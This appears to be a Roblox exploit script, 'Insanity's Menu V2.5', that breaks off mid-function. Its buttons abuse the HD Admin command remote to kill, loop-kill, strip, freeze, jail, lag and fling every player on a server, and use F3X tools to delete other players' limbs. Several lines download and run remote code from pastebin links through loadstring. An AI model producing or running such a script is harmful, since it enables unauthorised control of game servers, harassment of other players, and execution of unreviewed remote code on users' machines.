local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()
loadstring(game:HttpGet("https://pastebin.com/raw/yQY7zRca"))()

local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()

local Window = Library.CreateLib("Insanity's Menu V2.5", "Ocean")

 

local Main = Window:NewTab("Self Options")

local MainSection = Main:NewSection("Self Options")

local Main2 = Window:NewTab("All Player Options")

local MainSection2 = Main2:NewSection("All Player Options")

local Main3 = Window:NewTab("Weapon/Gear Options")

local MainSection3 = Main3:NewSection("Weapon/Gear Options")

local Main4 = Window:NewTab("Player Options")

local MainSection4 = 

Main4:NewSection("Player Options")

local Main5 = Window:NewTab("Fun Options")

local MainSection5 = Main5:NewSection("Fun Options")

 

MainSection:NewButton("God","", function()

local args = {

    [1] = ";god"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

MainSection:NewButton("FF","", function()

local args = {

    [1] = ";ff"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

MainSection:NewButton("WalkSpeed","", function()

game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 300

 

end)

 

MainSection:NewButton("JumpPower","", function()

game.Players.LocalPlayer.Character.Humanoid.JumpPower = 150

 

end)

 


MainSection:NewTextBox("Silent Cmd", "", function(txt)

	local args = {

    [1] = ";" .. txt ..""

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)


 

MainSection:NewButton("Refresh","", function()

local args = {

    [1] = ";refresh"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

MainSection:NewButton("R6","", function()

local args = {

    [1] = ";r6"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

MainSection:NewButton("R15","", function()

local args = {

    [1] = ";r15"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 


 

 MainSection:NewButton("HD Fly","", function()


local args = {

    [1] = ";fly"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

 

end)



MainSection:NewButton("HD Fly Undectable","", function()


local args = {

    [1] = ";noclip2"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

 

end)



MainSection:NewButton("UnJail","", function()


local args = {

    [1] = ";unjail"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

 

end)

 
 MainSection:NewButton("UnFreeze","", function()


local args = {

    [1] = ";unice"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

 

end)

 
 MainSection:NewTextBox("Disguise", "", function(txt)

	local args = {

    [1] = ";char me" .. txt ..""

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)


 
MainSection2:NewButton("Kill All","", function()

local args = {

    [1] = ";kill all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection2:NewButton("LoopKill All","", function()

local args = {

    [1] = ";loopkill all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection2:NewButton("UnloopKill All","", function()

local args = {

    [1] = ";unloopkill all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)


MainSection2:NewButton("Naked All","", function()

local args = {

    [1] = ";shirt all 0 ;pants all 0 "

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

 
 MainSection2:NewButton("Shirtless All","", function()

local args = {

    [1] = ";shirt all 0"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

 
 MainSection2:NewButton("Pantsless All","", function()

local args = {

    [1] = ";pants all 0 "

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection2:NewButton("God All","", function()

local args = {

    [1] = ";god all  "

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

MainSection2:NewButton("SemiGod All","", function()

local args = {

    [1] = ";health all 5000"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)


 MainSection2:NewButton("UnGod All","", function()

local args = {

    [1] = ";health all 100"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

MainSection2:NewButton("Freeze All V2","", function()

local args = {

    [1] = ";speed all 0"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

MainSection2:NewButton("Ragdoll All","", function()
local args = {

    [1] = ";sit all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

MainSection2:NewButton("Clear Apperance All","", function()

local args = {

    [1] = ";clearhats all ;paint all white ;shirt all 0 ;pants all 0"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

MainSection2:NewButton("Neon All","", function()

local args = {

    [1] = ";neon all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)



MainSection2:NewButton("Disable All","", function()

local args = {

    [1] = ";speed all 0 | ;jumppower all 0 | ;sit all  "

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

MainSection2:NewButton("R6 All","", function()
local args = {

    [1] = ";r6 all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 



end)

MainSection2:NewButton("R15 All","", function()
local args = {

    [1] = ";r15 all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 



end)



MainSection2:NewButton("Launch All","", function()
local args = {

    [1] = ";jumppower all 8900 ;jump all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 


end)

MainSection2:NewButton("Skydive All ","", function()

last_pick_sin_mrazy = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1e9, 1e8, 0) 

wait(0.5)

local args = {

    [1] = ";bring all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 


end)

MainSection2:NewButton("Heaven Prison All (OP) ","", function()

last_pick_sin_mrazy = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame 
    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1e9, 1e8, 0) 

wait(0.5)

local args = {

    [1] = ";bring all ;jail all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 


end)

MainSection2:NewButton("SuperSlow All","", function()

local args = {

    [1] = ";speed all 1"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)


MainSection2:NewButton("Bald All","", function()

local args = {

    [1] = ";clearhats all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

MainSection2:NewButton("Stick All","",function() 

local args = {

    [1] = ";width all 0 ;depth all 0.09"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 MainSection2:NewButton("Sink All (F3X)","", function()

F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})





F3X.Object(player.Character.HumanoidRootPart):Destroy()

F3X.Object(player.Character.Humanoid).Sit = true

      end)

end






end)





MainSection2:NewButton("NoLegs All (F3X)","", function()

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})





F3X.Object(player.Character["Right Leg"]):Destroy()

F3X.Object(player.Character["Left Leg"]):Destroy()

F3X.Object(player.Character["LeftUpperLeg"]):Destroy()

F3X.Object(player.Character["RightUpperLeg"]):Destroy()

      end)

end






end)

MainSection2:NewButton("NoArms All (F3X)","", function()

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})





F3X.Object(player.Character["Right Arm"]):Destroy()

F3X.Object(player.Character["Left Arm"]):Destroy()

F3X.Object(player.Character.RightUpperArm):Destroy()

F3X.Object(player.Character.LeftUpperArm):Destroy()

      end)

end






end)


MainSection2:NewButton("NoLimbs All (F3X)","", function()

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})





F3X.Object(player.Character["Right Arm"]):Destroy()

F3X.Object(player.Character["Left Arm"]):Destroy()

F3X.Object(player.Character["Left Leg"]):Destroy()

F3X.Object(player.Character["Right Leg"]):Destroy()
      end)

end






end)



MainSection2:NewButton("BlockHead All (F3X)","", function()

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})





F3X.Object(player.Character.Head["Mesh"]):Destroy()

      end)

end






end)


MainSection2:NewButton("SuperFling All","", function()

local args = {

    [1] = ";superfling all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 



end)


MainSection2:NewButton("Punish All","", function()

local args = {

    [1] = ";punish all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)


MainSection2:NewButton("Fart All (F3X)","", function()

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})



  

local yes = F3X.Object(player.Character.Torso):AddSmoke()

yes.Size = 0.43

yes.Color = Color3.new(0,3,0)

    



      end)

end





end)







MainSection2:NewButton("Crucify All (F3X)","", function()

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})

      F3X.Object(player.Character.HumanoidRootPart).Anchored = true

wait(2)

    local part = F3X.new("Part", workspace)

       part.CanCollide = false

part.BrickColor = BrickColor.new(217)

part.Material = ("Wood")

part:AddFire().Size = 8

       part.Size = Vector3.new(0.8, 10, 1)

       part.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(0, -0.5, 1)

          wait()

      part:WeldTo(player.Character.HumanoidRootPart)

          local part = F3X.new("Part", workspace)

       part.CanCollide = false

part.BrickColor = BrickColor.new(217)

part.Material = ("Wood")

       part.Size = Vector3.new(0.8, 1, 5)

       part:AddFire().Size = 8

       part.CFrame = player.Character.HumanoidRootPart.CFrame *CFrame.Angles(0,4.76,0) * CFrame.new(1, 2, 0)

          wait()

      part:WeldTo(player.Character.HumanoidRootPart)

      

end)

end



end)


MainSection2:NewButton("Spike All","",function()

local args = {

    [1] = ";height all 0.01 ;width all 0.01 ;depth all 99"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

 

MainSection2:NewButton("Furry All","",function() 

local args = {

    [1] = ";clearhats all | ;paint all white | ;morph all johndoe | ;hat all 12333387301"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

MainSection2:NewButton("DreamyBull All","",function() 

local args = {

    [1] = ";char all peppapiglover4mylife"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

 

 

MainSection2:NewButton("Flatten All","", function()

local args = {

    [1] = ";depth all 0"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

MainSection2:NewButton("Fire All","", function()

local args = {

    [1] = ";fire all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)


MainSection2:NewButton("Creeper All (F3X)","", function()

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})





F3X.Object(player.Character["Right Arm"]):Destroy()

F3X.Object(player.Character["Left Arm"]):Destroy()

F3X.Object(player.Character.Head["Mesh"]):Destroy()

      end)

end






end)

MainSection2:NewButton("Red Head All (F3X)","", function()

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})



F3X.Object(player.Character["Head"]).BrickColor.new(21)

      end)

end






end)

 MainSection2:NewButton("Sparkles All","", function()

local args = {

    [1] = ";sparkles all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)




MainSection2:NewButton("Headless All","", function()

local args = {

    [1] = ";headsize all 0"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

 
 

MainSection2:NewButton("Void All","", function()

local args = {

    [1] = ";apparate all inf"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

 MainSection2:NewButton("Box All (F3X)","", function()

local F3X = loadstring(game:HttpGet("https://pastebin.com/raw/TQgu7X5u"))()



for _,player in pairs(game.Players:GetPlayers()) do

   spawn(function()

       F3X.Edit(player.Character:GetChildren(), {})





F3X.Object(player.Character["Right Arm"]):Destroy()

F3X.Object(player.Character["Left Arm"]):Destroy()

F3X.Object(player.Character["Right Leg"]):Destroy()

F3X.Object(player.Character["Left Leg"]):Destroy()

F3X.Object(player.Character.Head["Mesh"]):Destroy()
      end)

end






end)


MainSection2:NewButton("Bring All","", function()

local args = {

    [1] = ";bring all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

MainSection2:NewButton("Freeze All","", function()

local args = {

    [1] = ";freeze all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

 

 

 

MainSection2:NewButton("Fast All","", function()

local args = {

    [1] = ";speed all 200"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 MainSection2:NewButton("Lag All (SPAM)","", function()

local args = {

    [1] = ";poop all | ;re all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

MainSection2:NewButton("Slow All","", function()

local args = {

    [1] = ";speed all 10"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

 

 

MainSection2:NewButton("Gold All","", function()

local args = {

    [1] = ";gold all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

 

 

 

 


 

MainSection2:NewButton("Fling All","", function()

local args = {

    [1] = ";fling all "

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

MainSection2:NewButton("Explode All","", function()

local args = {

    [1] = ";explode all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

MainSection2:NewButton("Fat All","", function()

local args = {

    [1] = ";fat all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

MainSection2:NewButton("Spin All","", function()

local args = {

    [1] = ";spin all 9999999999"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)
 
MainSection2:NewButton("SuperFat All","", function()

local args = {

    [1] = ";width all 5"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)
 

MainSection2:NewButton("1337 Shirt All","", function()

local args = {

    [1] = ";shirt all 19262627"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)
 
 MainSection2:NewButton("1337 Title All","", function()

local args = {

    [1] = ";titleg all 1337"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)
 
MainSection2:NewButton("Hacker Mask All","", function()

local args = {

    [1] = ";hat all 11464397213"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end) 

MainSection2:NewButton("Hackerify All","", function()

local args = {

    [1] = ";shirt all 4800479830 | ;pants all 3959787328 | ;hat all 11464397213"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end) 

 MainSection2:NewButton("Epic Face Shirt All","", function()

local args = {

    [1] = ";shirt all 24774766"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end) 
MainSection2:NewButton("BigHead All","", function()

local args = {

    [1] = ";headsize all 20"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)
 

MainSection2:NewButton("Long All","", function()

local args = {

    [1] = ";height all 50"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 
MainSection2:NewButton("Very Long All","", function()

local args = {

    [1] = ";height all 200 "

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)
 

MainSection2:NewButton("Short All","", function()

local args = {

    [1] = ";height all 0.50"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

 

 

MainSection2:NewButton("Small All","", function()

local args = {

    [1] = ";size all 0.3"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

 

 

MainSection2:NewButton("Giant All","", function()

local args = {

    [1] = ";size all 20"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

 

 

MainSection2:NewButton("Remove Body All","", function()

local args = {

    [1] = ";height all 0"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 
MainSection2:NewButton("Red All","", function()

local args = {

    [1] = ";paint all red"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)
 
 MainSection2:NewButton("Black All","", function()

local args = {

    [1] = ";paint all black"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

MainSection2:NewButton("1337 Color All","", function()

local args = {

    [1] = ";paint all green"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

MainSection2:NewButton("Invisible All","", function()

local args = {

    [1] = ";invisible all"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

 

 

 

MainSection2:NewButton("Hackertag All","", function()

local args = {

    [1] = ";title all mlg pro haxor"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

 

 

MainSection2:NewButton("Gold Box All","", function()
local args = {
    [1] = ";r15 all ;size all 10 ;gold all ;clearhats all "
}

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)


 MainSection2:NewButton("Red Sparkles All","", function()

local args = {

    [1] = ";hat all 173624749"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)



MainSection2:NewButton("Blue Sparkles All","", function()

local args = {

    [1] = ";hat all 173624602"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)



MainSection2:NewButton("Purple Sparkles All","", function()

local args = {

    [1] = ";hat all 173624697"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)



MainSection2:NewButton("Green Sparkles All","", function()

local args = {

    [1] = ";hat all 173624561"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

 

 MainSection2:NewButton("Orange Sparkles All","", function()

local args = {

    [1] = ";hat all 173624651"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)



MainSection2:NewButton("White Sparkles All","", function()

local args = {

    [1] = ";hat all 89171071"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

 

 

 

 

 

MainSection3:NewButton("Weapons Kit","", function()

local args = {

    [1] = ";gear me 116693764"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

local args = {

    [1] = ";gear me 94233344"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

local args = {

    [1] = ";gear me 95354288"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

local args = {

    [1] = ";gear me 880453518"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

MainSection3:NewButton("Scythe","", function()

local args = {

    [1] = ";gear me 846792499"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Soul Stealer","", function()

local args = {

    [1] = ";gear me 94794774"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Amethyst Periastron","", function()

local args = {

    [1] = ";gear me 93136802"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)


MainSection3:NewButton("Airstrike Radio","", function()

local args = {

    [1] = ";gear me 88885539"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Tri Lazer 300","", function()

local args = {

    [1] = ";gear me 139578207"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("HyperLaser Gun","", function()

local args = {

    [1] = ";gear me 130113146"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Subspace Tripmine","", function()

local args = {

    [1] = ";gear me 11999247"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("OP Hammer","", function()

local args = {

    [1] = ";gear me 45177979"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Rocket Launcher","", function()

local args = {

    [1] = ";gear me 32356064"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Rainbow Periaston Sword","", function()

local args = {

    [1] = ";gear me 159229806"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)


MainSection3:NewButton("Fuse Bomb","", function()

local args = {

    [1] = ";gear me 11563251"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)


MainSection3:NewButton("OP Sword","", function()

local args = {

    [1] = ";gear me 21416138"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)



MainSection3:NewButton("Ban Hammer","", function()

local args = {

    [1] = ";gear me 10468797"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Gravity Hammer","", function()

local args = {

    [1] = ";gear me 33866846"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Explosive Hammer","", function()

local args = {

    [1] = ";gear me 53623350"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Baseball Bat","", function()

local args = {

    [1] = ";gear me 55301897"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Sword Of Light","", function()

local args = {

    [1] = ";gear me 77443461"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Red Periaston","", function()

local args = {

    [1] = ";gear me 99119240"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Bazooka (OP)","", function()

local args = {

    [1] = ";gear me 169602103"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Bone Sword (OP)","", function()

local args = {

    [1] = ";gear me 95951291"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("Remote Bomb (OP)","", function()

local args = {

    [1] = ";gear me 33383241"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
end)

MainSection3:NewButton("BTools Pack","", function()

local args = {

    [1] = ";gear me 16969792"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))


local args = {

    [1] = ";gear me 16201628"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

local args = {

    [1] = ";gear me 16200420"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

local args = {

    [1] = ";gear me 16200508"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))


local args = {

    [1] = ";gear me 58880579"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))


local args = {

    [1] = ";gear me 60791062"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)



MainSection4:NewTextBox("View", "", function(txt)

	local args = {

    [1] = ";view " .. txt ..""

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)



MainSection4:NewButton("Unview","", function()

local args = {

    [1] = ";unview"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

MainSection4:NewTextBox("Goto", "", function(txt)

	local args = {

    [1] = ";to " .. txt ..""

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

 

end)

MainSection5:NewButton("Annoying Car Engine","", function()

local args = {

    [1] = ";music 6491883020 | ;volume inf | ;pitch 9"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)



MainSection5:NewButton("Xx_INS4NO_xX theme","", function()

local args = {

    [1] = ";music 6783714255 | ;volume inf | ;pitch 0.7"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)


MainSection5:NewButton("c00l music","", function()

local args = {

    [1] = ";music 6942391979 | ;volume inf |"

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

end)

MainSection5:NewButton("Inject Insanity's Admin FAKE","", function()

local args = {

    [1] = ";talk all Insanity's Admin Loading..."

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

task.wait(5)

local args = {

    [1] = ";talk all Loaded! Loading Commands..."

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

local args = {

    [1] = ";sh Commands: Kill, Freeze, Disable, R6, R15, Skydive, Launch."

}

 

game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))

task.wait(0.2)

local args = {

